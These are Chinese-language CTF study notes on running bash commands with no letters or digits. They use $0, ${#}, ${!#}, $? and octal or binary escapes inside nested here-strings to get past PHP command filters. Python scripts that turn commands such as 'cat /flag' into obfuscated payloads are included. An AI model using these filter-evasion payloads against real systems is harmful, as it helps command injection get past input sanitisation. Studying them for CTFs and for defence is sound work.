# 极限条件下的命令执行

### 无数字字母构造bash命令

####  bash中!的用法

`!` 可以用于间接引用变量，例如：

bash复制

```bash
varname="myvar"
echo ${!varname}  # 输出 myvar 的值
```

#### $的用法

> | 变量名 | 含义                                                  |
> | ------ | ----------------------------------------------------- |
> | $0     | 脚本本身的名字                                        |
> | $1     | 脚本后所输入的第一串字符                              |
> | $2     | 传递给该shell脚本的第二个参数                         |
> | $*     | 脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’          |
> | $@     | 脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’          |
> | $_     | 表示上一个命令的最后一个参数                          |
> | $#     | #脚本后所输入的字符串个数                             |
> | $$     | 脚本运行的当前进程ID号                                |
> | $!     | 表示最后执行的后台命令的PID                           |
> | $?     | 显示最后命令的退出状态，0表示没有错误，其他表示由错误 |

``````bash
bash<<<'ls'			# 用bash执行ls
bash<<<$'\154\163'		# linux可以识别八进制表示的字符，将ls用八进制字符替换
bash<<<$\'\\$((2#10011010))\\$((2#10100011))\'	# \154\163八进制替换成二进制 \$((2#10011010))\$((2#10100011))
$0<<<$\'\\$((2#10011010))\\$((2#10100011))\'   	# 将bash用$0代替

# 由于上面执行方法不能待参数例如：ls / 或者cat flag，在ctfshow的极限命令执行题目里g4师傅给出了一种解决这种问题的方法——通过两次here-strings的方法来解析复杂的带参数命令
$0<<<$0\<\<\<\$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\\$(($((1<<1))#101000))\\$(($((1<<1))#111001))\' # 两次here-strings的方法来解析复杂的带参数命令

# $((1<<1))代替2
$0<<<$0\<\<\<\$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'

####替换数字
# 用 #{}！ 继续替换数字${#}替换0,$${##}替换1,${!#}替换$0
┌──(kali㉿kali)-[~/桌面/工具/php_mt_seed-4.0]
└─$ echo ${!#}                                                                                               bash
┌──(kali㉿kali)-[~/桌面/工具/php_mt_seed-4.0]
└─$ echo ${##}  
1                                      
┌──(kali㉿kali)-[~/桌面/工具/php_mt_seed-4.0]
└─$ echo ${#} 
0

${!#}<<<${!#}\<\<\<\$\'\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}))\\$(($((${##}<<${##}))#${##}${##}${##}${#}${#}${##}))\'

# php的system解析不了${!#}这么复杂的命令把${!#}<<<${!#}替换成__=${#};${!__}<<<${!__}
__=${#};${!__}<<<${!__}\<\<\<\$\'\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}))\\$(($((${##}<<${##}))#${##}${##}${##}${#}${#}${##}))\'

#### 利用$?构造从上一次构造我们其实可以发现，只要我们找到一个代表值为零的变量就可以得到bash进而继续构造，$?这个变量自然而然进入我的视线，它可以显示最后命令的退出状态，0表示没有错误，其他表示有错误 ，因此只要我们的payload最后不报错它的值自然还是0了：
$0<<<$0\<\<\<\$\'\\$((2#10011010))\\$((2#10100011))\'

# 自增产生012 $______等于0用!$_____生成bash命令
__=${?}&&___=$((++__))&&____=$((++___))&&_____=${?}&&${!_____}<<<${!_____}\<\<\<\$\'\\$((2#10011010))\\$((2#10100011))\\$((2#101000))\\$((2#111001))\'

# 用${_____}替换0，${__}替换1，${____}替换2
__=${?}&&___=$((++__))&&____=$((++___))&&_____=${?}&&${!_____}<<<${!_____}\<\<\<\$\'\\$((${____}#${__}${_____}${_____}${__}${__}${_____}${__}${_____}))\\$((${____}#${__}${_____}${__}${_____}${_____}${_____}${__}${__}))\\$((${____}#${__}${_____}${__}${_____}${_____}${_____}))\\$((${____}#${__}${__}${__}${_____}${_____}${__}))\'

#### 利用$(())替代$?达到同样效果
__=$(())&&___=$((++__))&&____=$((++___))&&_____=${?}&&${!_____}<<<${!_____}\<\<\<\$\'\\$((${____}#${__}${_____}${_____}${__}${__}${_____}${__}${_____}))\\$((${____}#${__}${_____}${__}${_____}${_____}${_____}${__}${__}))\\$((${____}#${__}${_____}${__}${_____}${_____}${_____}))\\$((${____}#${__}${__}${__}${_____}${_____}${__}))\'

``````

bash无代码字符数子执行命令利用脚本

```python
cmd='cat /flag'

payload='__=${#};${!__}<<<${!__}\\<\\<\\<\\$\\\''
for c in cmd:
        payload+=f'\\\\$(($((1<<1))#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1','${##}').replace('0','${#}')

payload+='\\\''

print(payload)
```

``````python
cmd='cat /flag'

payload='__=${?}&&___=$((++__))&&____=$((++___))&&_____=${?}&&${!_____}<<<${!_____}\\<\\<\\<\\$\\\''
for c in cmd:
        payload+=f'\\\\$((2#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1','${__}').replace('2','${____}').replace('0','${_____}')

payload+='\\\''

print(payload)
``````

```python
cmd='cat /flag'

payload='__=$(())&&___=$((++__))&&____=$((++___))&&_____=$(())&&${!_____}<<<${!_____}\\<\\<\\<\\$\\\''
for c in cmd:
        payload+=f'\\\\$((2#{bin(int(oct(ord(c))[2:]))[2:]}))'.replace('1','${__}').replace('2','${____}').replace('0','${_____}')

payload+='\\\''

print(payload)
```